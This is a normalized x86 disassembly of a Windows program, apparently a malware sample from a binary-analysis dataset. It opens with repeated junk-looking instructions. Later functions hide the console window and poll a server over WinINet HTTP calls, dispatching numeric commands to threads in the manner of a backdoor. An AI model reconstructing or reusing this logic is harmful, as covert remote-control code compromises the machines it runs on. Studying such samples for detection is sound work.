pop eax
jae r-xdata
call 0xe3aabb1
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918ac2
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
test [ ebp - 0x74000005 ] ebx
lea esp [ ecx - 0x74000005 ]
xchg ebp eax
movsd [ edi ] [ esi ]
sti
call sub_403678
mov esp 0x890f0573
out 0xff eax
and eax 0x5c244481
cwde
inc eax
add [ ebx + 0x57504ec ] al
push edx
push ebp
sub esp 0xc
call sub_403609
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_403643
sub esp 0x4
push esi
push esp
push esi
push eax
push ecx
call sub_40365d
jpo 0x59283bd3
jne r-xdata
jge r-xdata
or eax 0xbb067358
pop eax
jae r-xdata
call 0xe3aabb1
add [ esp + 0x10 ] 0x6
sub esp 0x4
ja r-xdata
mov ebx 0x81f5735a
jmp r-xdata
ja r-xdata
jae 0x53918ac2
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
test [ ebp - 0x74000005 ] ebx
lea esp [ ecx - 0x74000005 ]
xchg ebp eax
movsd [ edi ] [ esi ]
sti
call sub_403678
mov esp 0x890f0573
push edx
push ebp
sub esp 0xc
call sub_403609
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
cwde
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3c93
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_40365d
pop edx
jae r-xdata
pop eax
jne r-xdata
sub ebx 0x10244483
push es
jge r-xdata
or eax 0xbb067358
ja r-xdata
jae 0x53918ac2
pop eax
jae r-xdata
call 0xe3aabb1
push eax
push esp
push ecx
push ebx
mov edi 0x8102795a
idiv bh
and al 0x24
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
test [ ebp - 0x74000005 ] ebx
lea esp [ ecx - 0x74000005 ]
xchg ebp eax
movsd [ edi ] [ esi ]
sti
call sub_403678
mov esp 0x890f0573
sub esp 0x4
ja r-xdata
add [ esp + 0x10 ] 0x6
mov ebx 0x81f5735a
jmp r-xdata
add cl [ edi ]
mov [ ebx + 0x248246c ] es
sub esp 0x4
jge r-xdata
push edx
push ebp
sub esp 0xc
call sub_403609
add esi 0x83bc0873
les eax [ ebx + esi * 2 ]
out 0xff eax
and eax 0x5c244481
cwde
inc eax
add [ ebx + 0x57504ec ] al
jmp 0xffffffff8d4f3c93
sub edi 0xf0e7159
xchg [ edx + 0x55 ] edx
sub_403678
jae r-xdata
pop edx
jns 0x5b0026f7
jmp [ esp + 0x24 ]
xor esi 0x242464ff
mov ch 0xe1
mov ah 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ecx 0x8b0cc483
test [ ebp - 0x74000005 ] ebx
lea esp [ ecx - 0x74000005 ]
xchg ebp eax
movsd [ edi ] [ esi ]
sti
jns r-xdata
sub_403810
push ebp
mov ebp esp
and esp 0xfffffff0
sub esp 0x188
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x184 ] eax
push esi
push edi
push 0x80
lea eax [ esp + 0x8c ]
mov esi ecx
push 0x0
push eax
call sub_411230
add esp 0xc
lea eax [ esp + 0x18 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ rw-data ]
xor edx edx
add eax 0x11
or edi 0xffffffff
imul ecx eax 0x77
push 0xffffffff
add ecx [ esp + 0x1c ]
mov eax ecx
mov [ rw-data ] ecx
div edi
add eax ecx
push eax
lea eax [ esp + 0x90 ]
push r--data
push eax
call sub_4072f0
add esp 0x10
mov [ esp + 0x30 ] r--data
lea eax [ esp + 0x30 ]
mov [ esp + 0x34 ] 0x0
push 0x0
push 0x84400100
push eax
push 0x0
push r--data
lea eax [ esp + 0x9c ]
push eax
push r--data
push esi
call [ HttpOpenRequestA@IAT ]
mov esi eax
xorps xmm0 xmm0
lea eax [ esp + 0x70 ]
movaps [ esp + 0x70 ] xmm0
push eax
lea eax [ esp + 0x64 ]
movaps [ esp + 0x64 ] xmm0
push r--data
push eax
call sub_407330
add esp 0xc
mov [ esp + 0x10 ] 0x10
lea eax [ esp + 0x10 ]
push 0x0
push eax
lea eax [ esp + 0x68 ]
push eax
push 0x17
push esi
call [ HttpQueryInfoA@IAT ]
mov edi [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov edi [ InternetSetOptionA@IAT ]
lea eax [ esp + 0x28 ]
push 0x4
push eax
push 0x2
push esi
mov [ esp + 0x38 ] 0x7530
call edi
push 0x4
lea eax [ esp + 0x2c ]
push eax
push 0x6
push esi
call edi
push 0x4
lea eax [ esp + 0x2c ]
push eax
push 0x5
push esi
call edi
push 0x80
lea eax [ esp + 0x10c ]
push 0x0
push eax
call sub_411230
mov eax [ rw-data ]
add esp 0xc
inc eax
push eax
push [ rw-data ]
lea eax [ esp + 0x110 ]
push [ rw-data ]
push r--data
push eax
call sub_4072f0
add esp 0x14
lea eax [ esp + 0x108 ]
push 0xa0000000
push 0xffffffff
push eax
push esi
call [ HttpAddRequestHeadersA@IAT ]
xorps xmm0 xmm0
mov [ esp + 0x5c ] 0x0
movups [ esp + 0x3c ] xmm0
mov [ esp + 0x38 ] 0x28
movups [ esp + 0x4c ] xmm0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x14 ] 0x0
call edi
call edi
push rw-data
call [ EnterCriticalSection@IAT ]
call sub_401c70
mov edi eax
push rw-data
mov [ esp + 0x14 ] edi
call [ LeaveCriticalSection@IAT ]
mov ecx [ edi + 0x8 ]
push 0xf010
push 0x0
push rw-data
mov [ esp + 0x60 ] ecx
call sub_411230
add esp 0xc
lea eax [ edi + 0x10 ]
push [ edi + 0x8 ]
push eax
push rw-data
call sub_4117a0
mov eax [ edi + 0x8 ]
add esp 0xc
mov [ rw-data ] eax
lea eax [ esp + 0x38 ]
push 0x0
push 0x0
push 0x0
push eax
push esi
call [ HttpSendRequestExW@IAT ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ edi + 0xc ]
mov [ esp + 0x10 ] edi
cmp eax 0x1
jne r-xdata
lea eax [ esp + 0x2c ]
push eax
push [ rw-data ]
push rw-data
push esi
call [ InternetWriteFile@IAT ]
push 0xf020
push [ esp + 0x14 ]
mov edi eax
call sub_40d57b
add esp 0x8
test edi edi
je r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x44 ]
mov [ esp + 0x60 ] 0x0
push eax
push esi
call [ HttpSendRequestExW@IAT ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
mov ecx rw-data
push eax
call sub_401e50
jmp r-xdata
call [ GetLastError@IAT ]
mov edi eax
push [ rw-data ]
call [ SetEvent@IAT ]
jmp r-xdata
int3
lea eax [ esp + 0x10 ]
mov ecx rw-data
push eax
call sub_401e50
jmp r-xdata
lea eax [ esp + 0x70 ]
xorps xmm0 xmm0
push eax
lea eax [ esp + 0x64 ]
movaps [ esp + 0x74 ] xmm0
push r--data
push eax
movaps [ esp + 0x6c ] xmm0
call sub_407330
add esp 0xc
mov [ esp + 0x24 ] 0x10
lea eax [ esp + 0x24 ]
push 0x0
push eax
lea eax [ esp + 0x68 ]
push eax
push 0x13
push esi
call [ HttpQueryInfoA@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
cmp edi 0x2f00
je r-xdata
push 0x0
push 0x0
push 0x0
push esi
call [ HttpEndRequestW@IAT ]
test eax eax
jne r-xdata
mov edi [ GetLastError@IAT ]
call edi
call edi
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x60 ]
call sub_4043b0
mov edi [ GetLastError@IAT ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
lea eax [ esp + 0x70 ]
xorps xmm0 xmm0
push eax
lea eax [ esp + 0x64 ]
movaps [ esp + 0x64 ] xmm0
push r--data
push eax
call sub_407330
add esp 0xc
mov [ esp + 0x18 ] 0x10
lea eax [ esp + 0x18 ]
push 0x0
push eax
lea eax [ esp + 0x68 ]
push eax
push 0x5
push esi
call [ HttpQueryInfoA@IAT ]
test eax eax
je r-xdata
cmp eax 0x197
je r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0xc8
je r-xdata
push esi
call [ InternetCloseHandle@IAT ]
mov ecx [ esp + 0x18c ]
mov eax edi
pop edi
pop esi
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
call edi
call edi
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x60 ]
call sub_4043b0
jmp r-xdata
push esi
call [ InternetCloseHandle@IAT ]
mov eax 0x2ee4
pop edi
pop esi
mov ecx [ esp + 0x184 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
push esi
call [ InternetCloseHandle@IAT ]
xor eax eax
pop edi
pop esi
mov ecx [ esp + 0x184 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
push r--data
lea eax [ esp + 0x64 ]
xorps xmm0 xmm0
push r--data
push eax
movaps [ esp + 0x6c ] xmm0
call sub_407330
add esp 0xc
mov [ esp + 0x18 ] 0x10
lea eax [ esp + 0x18 ]
push 0x0
push eax
lea eax [ esp + 0x68 ]
push eax
push 0xffff
push esi
call [ HttpQueryInfoA@IAT ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
call edi
call edi
lea edx [ esp + 0x24 ]
lea ecx [ esp + 0x60 ]
call sub_4043b0
jmp r-xdata
lea eax [ esp + 0x18 ]
mov edx 0xffff
push eax
push r--data
mov ecx esi
call sub_404320
add esp 0x8
test eax eax
jne r-xdata
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
mov edx 0xffff
push eax
push r--data
mov ecx esi
call sub_404320
add esp 0x8
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
mov edx 0xffff
push eax
push r--data
mov ecx esi
call sub_404320
add esp 0x8
test eax eax
jne r-xdata
cmp [ esp + 0x18 ] 0x1
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call [ EnterCriticalSection@IAT ]
push rw-data
mov [ rw-data ] 0x4
call [ LeaveCriticalSection@IAT ]
cmp eax 0x1
jne r-xdata
mov edi [ EnterCriticalSection@IAT ]
push rw-data
call edi
mov eax [ esp + 0x24 ]
mov [ rw-data ] eax
mov eax [ esp + 0x10 ]
push rw-data
mov [ rw-data ] eax
mov [ rw-data ] 0x1
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
mov edi [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
add eax 0x2
cmp [ esp + 0x10 ] eax
jne r-xdata
push 0xf010
push 0x0
push rw-data
call sub_411230
add esp 0xc
mov [ esp + 0x14 ] 0x0
lea eax [ esp + 0x14 ]
push eax
push 0xf010
push rw-data
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
pop edi
pop esi
mov ecx [ esp + 0x184 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
nop [ eax + eax ] ax
push esi
call [ InternetCloseHandle@IAT ]
mov eax 0xd
pop edi
pop esi
mov ecx [ esp + 0x184 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
mov edi [ EnterCriticalSection@IAT ]
push rw-data
call edi
mov eax [ esp + 0x10 ]
push rw-data
mov [ rw-data ] eax
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
push 0x3e8
call [ Sleep@IAT ]
push esi
call [ InternetCloseHandle@IAT ]
xor eax eax
pop edi
pop esi
mov ecx [ esp + 0x184 ]
xor ecx esp
call sub_40d56a
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x1
jne r-xdata
push 0xf010
push 0x0
push rw-data
call sub_411230
add esp 0xc
mov [ esp + 0x14 ] 0x0
lea eax [ esp + 0x14 ]
push eax
push 0xf010
push rw-data
push esi
call [ InternetReadFile@IAT ]
test eax eax
jne r-xdata
push rw-data
call edi
push 0xf010
push 0x0
push [ rw-data ]
call sub_411230
add esp 0xc
push [ esp + 0x14 ]
push rw-data
push [ rw-data ]
call sub_4117a0
add esp 0xc
push [ rw-data ]
call [ SetEvent@IAT ]
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax 0x300b
je r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
push 0xf010
call sub_40d84f
add esp 0x4
mov edi eax
mov [ esp + 0x18 ] edi
push 0xf010
push 0x0
push edi
call sub_411230
add esp 0xc
push 0xf010
push [ rw-data ]
push edi
call sub_4117a0
mov edi [ EnterCriticalSection@IAT ]
add esp 0xc
push rw-data
call edi
lea eax [ esp + 0x18 ]
push eax
call sub_406910
push rw-data
call [ LeaveCriticalSection@IAT ]
cmp eax 0x300c
jne r-xdata
sub_403f50
push ebp
mov ebp esp
push 0xffffffff
push sub_42a49e
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x18
xor ebx ebx
xor esi esi
call sub_40d5ac
mov edi eax
add esp 0x4
mov [ ebp - 0xe4 ] edi
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] ebx
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ eax ] bl
mov [ ebp - 0xec ] 0xf
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0x100 ] bl
cmp [ rw-data ] bl
jne r-xdata
mov eax [ edi ]
mov ecx rw-data
lea edx [ ecx + 0x1 ]
xor ecx ecx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
push ecx
push rw-data
lea ecx [ ebp - 0x100 ]
call sub_406a90
lea eax [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x0
cmp edi eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xec ]
cmp eax 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_406b90
lea eax [ ebp - 0x78 ]
mov ecx edi
push eax
call sub_4089b0
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x78 ]
mov edx [ InternetOpenA@IAT ]
mov [ ebp - 0xe4 ] 0x0
cmp ecx 0x1
jne r-xdata
inc eax
lea ecx [ ebp - 0x100 ]
push eax
push [ ebp - 0x100 ]
call sub_406f10
cmp ecx 0x2
jne r-xdata
cmp [ ebp - 0x4c ] 0x0
je r-xdata
lea eax [ ebp - 0xe0 ]
mov ecx edi
push eax
call sub_408c60
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0xe0 ] 0x8
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x48 ] 0x10
lea eax [ ebp - 0x5c ]
push 0x0
cmovae eax [ ebp - 0x5c ]
push 0x0
push eax
push 0x3
push r--data
call edx
movzx ecx [ rw-data ]
mov ebx eax
mov eax [ InternetConnectA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push ecx
push rw-data
push ebx
call eax
mov esi eax
mov ecx esi
call sub_403810
test eax eax
jne r-xdata
lea ecx [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0x1
call sub_404250
cmp [ ebp - 0xe4 ] 0x0
jne r-xdata
cmp [ ebp - 0x80 ] 0x10
lea eax [ ebp - 0x94 ]
push 0x0
cmovae eax [ ebp - 0x94 ]
push 0x0
push eax
push 0x3
push r--data
call [ InternetOpenA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
mov ebx eax
movzx eax [ rw-data ]
push 0x0
push eax
push rw-data
push ebx
call [ InternetConnectA@IAT ]
mov esi eax
mov ecx esi
call sub_403810
mov ecx [ ebp - 0xe4 ]
test eax eax
movzx ecx cl
mov edx 0x1
cmove ecx edx
mov [ ebp - 0xe4 ] ecx
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
push 0x0
cmovae eax [ ebp - 0x2c ]
push 0x0
push eax
push 0x3
push r--data
call edx
push 0x0
push 0x0
push 0x3
push 0x0
mov ebx eax
movzx eax [ rw-data ]
push 0x0
push eax
mov eax [ InternetConnectA@IAT ]
push rw-data
push ebx
call eax
mov esi eax
mov ecx esi
call sub_403810
test eax eax
je r-xdata
mov edi [ InternetCloseHandle@IAT ]
mov edi [ InternetCloseHandle@IAT ]
test esi esi
je r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
push esi
mov [ rw-data ] 0x0
call edi
push ebx
call edi
lea ecx [ ebp - 0x78 ]
call sub_404250
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
cmp [ rw-data ] 0x4
jne r-xdata
test ebx ebx
je r-xdata
push esi
call edi
mov ecx esi
call sub_403810
test eax eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
call [ InternetOpenA@IAT ]
push 0x0
push 0x0
push 0x3
push 0x0
mov ebx eax
movzx eax [ rw-data ]
push 0x0
push eax
push rw-data
push ebx
call [ InternetConnectA@IAT ]
mov esi eax
jmp r-xdata
push ebx
call edi
sub_404250
push esi
push edi
mov edi ecx
mov eax [ edi + 0x60 ]
lea esi [ edi + 0x4c ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_406f10
mov [ esi ] 0x0
lea esi [ edi + 0x34 ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov esi [ esi ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_406f10
mov [ esi ] 0x0
lea esi [ edi + 0x1c ]
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov esi [ esi ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
inc eax
mov ecx esi
push eax
push [ esi ]
call sub_406f10
mov [ esi ] 0x0
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov esi [ esi ]
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] 0x0
cmp [ edi + 0x18 ] 0x10
jb r-xdata
inc eax
lea ecx [ edi + 0x4 ]
push eax
push [ edi + 0x4 ]
call sub_406f10
mov [ edi + 0x4 ] 0x0
pop edi
pop esi
retn
mov eax [ edi + 0x4 ]
pop edi
pop esi
mov [ eax ] 0x0
retn
sub_404320
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xorps xmm0 xmm0
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push eax
lea eax [ ebp - 0x14 ]
mov esi edx
push r--data
push eax
mov edi ecx
movups [ ebp - 0x14 ] xmm0
call sub_407330
add esp 0xc
mov [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x18 ]
push 0x0
push eax
lea eax [ ebp - 0x14 ]
push eax
push esi
push edi
call [ HttpQueryInfoA@IAT ]
test eax eax
je r-xdata
mov esi [ GetLastError@IAT ]
call esi
call esi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov edx ebx
lea ecx [ ebp - 0x14 ]
call sub_4043b0
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_4043b0
push ebx
mov bl [ ecx ]
xor eax eax
push esi
cmp bl 0x2d
mov [ edx ] 0x0
mov esi 0x1
cmove eax esi
lea esi [ eax + ecx ]
mov al [ esi ]
test al al
je r-xdata
cmp bl 0x2d
jne r-xdata
movsx ecx al
lea eax [ ecx - 0x30 ]
cmp eax 0x9
jg r-xdata
pop esi
xor eax eax
pop ebx
retn
mov [ edx ] 0x0
pop esi
mov eax 0xd
pop ebx
retn
nop [ eax + eax ] eax
cmp bl 0x2d
jne r-xdata
movsx ecx al
lea eax [ ecx - 0x30 ]
cmp eax 0x9
jle r-xdata
mov eax [ edx ]
neg eax
pop esi
mov [ edx ] eax
xor eax eax
pop ebx
retn
mov eax [ edx ]
lea esi [ esi + 0x1 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax - 0x18 ]
lea eax [ ecx + eax * 2 ]
mov [ edx ] eax
mov al [ esi ]
test al al
je r-xdata
sub_404430
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0xf034
call sub_429c10
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xf030 ] eax
push ebx
push esi
push edi
call [ GetForegroundWindow@IAT ]
push 0x0
push r--data
call [ FindWindowA@IAT ]
push 0x0
push eax
call [ ShowWindow@IAT ]
push r--data
push r--data
call sub_403370
mov ebx [ LeaveCriticalSection@IAT ]
add esp 0x8
mov eax 0xf020
mov [ esp + 0x18 ] 0x20160509
mov [ esp + 0x1c ] 0x1001
lea esi [ esp + 0x18 ]
call sub_429c10
mov ecx 0x3c08
mov edi esp
[ edi ] [ esi ]
call sub_404660
add esp 0xf020
push 0x2710
call [ Sleep@IAT ]
jmp r-xdata
push rw-data
call esi
lea eax [ esp + 0xc ]
push eax
call sub_406ee0
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov esi [ EnterCriticalSection@IAT ]
call sub_404570
push rw-data
mov [ rw-data ] 0x1
call esi
call sub_401d50
push rw-data
call ebx
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ eax + 0x8 ]
mov edx esi
mov eax [ ecx + 0x8 ]
and esi 0x3
dec eax
shr edx 0x2
and edx eax
mov eax [ ecx + 0x4 ]
mov eax [ eax + edx * 4 ]
mov esi [ eax + esi * 4 ]
sub [ rw-data ] 0x1
jne r-xdata
mov ecx [ ecx ]
inc [ rw-data ]
mov [ rw-data ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
mov esi [ EnterCriticalSection@IAT ]
jne r-xdata
push 0x1
push esi
call sub_40d57b
add esp 0x8
push rw-data
call ebx
test esi esi
je r-xdata
sub_404570
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x68
push 0x0
push rw-data
call sub_411230
mov esi [ CreateEventW@IAT ]
add esp 0xc
push 0x0
push 0x0
push 0x1
push 0x0
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ ebp - 0x4 ] eax
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov ebx eax
call esi
mov esi [ InitializeCriticalSection@IAT ]
mov edi eax
push rw-data
call esi
push rw-data
call esi
push 0xf010
push 0x0
push rw-data
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
call sub_411230
push 0xf010
push 0x0
push rw-data
call sub_411230
mov eax [ ebp - 0x4 ]
add esp 0x18
mov [ rw-data ] eax
mov [ rw-data ] ebx
mov [ rw-data ] edi
push ebx
call [ SetEvent@IAT ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_404660
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
xor esi esi
push esi
push esi
push esi
push sub_403f50
push esi
push esi
call [ CreateThread@IAT ]
mov ebx [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
call ebx
mov esi eax
mov esi [ DeleteCriticalSection@IAT ]
push rw-data
call esi
push rw-data
call esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x1001
jne r-xdata
call sub_404740
mov edi [ WaitForMultipleObjects@IAT ]
lea eax [ ebp - 0x8 ]
push 0xffffffff
push esi
push eax
push 0x2
call edi
mov esi [ ResetEvent@IAT ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
mov ebx [ WaitForSingleObject@IAT ]
nop
call ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ rw-data ]
call esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0xffffffff
push [ rw-data ]
call ebx
call sub_404970
push [ rw-data ]
call esi
push 0xffffffff
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x2
call edi
test eax eax
je r-xdata
mov ebx [ GetLastError@IAT ]
sub_404740
push ebp
mov ebp esp
mov eax 0xf024
call sub_429c10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0xf010
lea eax [ ebp - 0xf018 ]
push 0x0
push eax
call sub_411230
add esp 0xc
mov [ ebp - 0xf018 ] 0x1000
call sub_404b80
cmp al 0x1
jne r-xdata
mov [ ebp - 0xf014 ] 0x20160509
mov eax [ rw-data ]
mov [ ebp - 0xf014 ] eax
mov ax [ rw-data ]
mov [ ebp - 0xf010 ] ax
jmp r-xdata
lea edx [ edi + 0xe ]
lea ecx [ ebp - 0xf018 ]
call sub_404820
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
nop [ eax ] eax
mov ebx [ QueryPerformanceCounter@IAT ]
lea eax [ ebp - 0xf020 ]
push eax
call ebx
mov edi [ ebp - 0xf020 ]
mov esi 0x0
and edi 0x1f
mov [ ebp - 0xf00e ] edi
jle r-xdata
lea eax [ ebp - 0xf020 ]
push eax
call ebx
mov ecx [ ebp - 0xf020 ]
mov eax 0x80808081
mul ecx
shr edx 0x7
add dl cl
mov [ ebp + esi - 0xf00a ] dl
inc esi
cmp esi edi
jl r-xdata
sub_404820
push ebp
mov ebp esp
sub esp 0x10
cmp [ rw-data ] 0x0
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x8 ] edi
jne r-xdata
push ebx
push 0xf020
call sub_40d5ac
push 0xf020
mov ebx eax
push 0x0
push ebx
mov [ ebp - 0x4 ] ebx
call sub_411230
push esi
mov [ ebx + 0x8 ] esi
add ebx 0x10
push edi
push ebx
call sub_4117a0
add esp 0x1c
test esi esi
jne r-xdata
pop edi
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
xor edi edi
test esi esi
jle r-xdata
mov al [ ebx + esi ]
inc esi
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax 0x3004
je r-xdata
mov ebx esi
mov ebx [ ebp - 0x4 ]
mov [ ebx + 0xc ] 0x0
cmp eax 0x3007
je r-xdata
add edi 0x10
sub ebx 0x10
cmp edi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x10
add eax edi
push eax
call sub_401840
xor eax eax
cmp ecx 0x1
pop ebx
sete al
pop edi
pop esi
lea eax [ eax * 2 - 0x1 ]
mov esp ebp
pop ebp
retn
push rw-data
call [ EnterCriticalSection@IAT ]
mov eax [ ebx + 0xc ]
mov [ ebp - 0x4 ] ebx
cmp eax 0x1
jne r-xdata
cmp eax 0x10003005
je r-xdata
cmp ebx 0x10
jl r-xdata
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov ecx rw-data
push eax
call sub_401e50
jmp r-xdata
cmp eax 0x10003006
je r-xdata
int3
lea eax [ ebp - 0x4 ]
mov ecx rw-data
push eax
call sub_401e50
jmp r-xdata
push [ rw-data ]
call [ ResetEvent@IAT ]
push rw-data
call [ LeaveCriticalSection@IAT ]
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov [ ebx + 0xc ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
push 0xffffffff
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push 0x0
push eax
push 0x2
call [ WaitForMultipleObjects@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
sub_404970
mov eax [ rw-data ]
cmp eax 0x3000
jg r-xdata
cmp eax 0x3008
jg r-xdata
je r-xdata
cmp eax 0x300e
jg r-xdata
je r-xdata
push 0x0
push 0x0
push 0x0
push sub_405010
push 0x0
push 0x0
call [ CreateThread@IAT ]
retn
cmp eax 0x1001
je r-xdata
cmp eax 0x300f
je r-xdata
je r-xdata
mov [ rw-data ] 0x0
retn
sub eax 0x3002
je r-xdata
push 0x0
push 0x0
push 0x0
push sub_404ae0
push 0x0
push 0x0
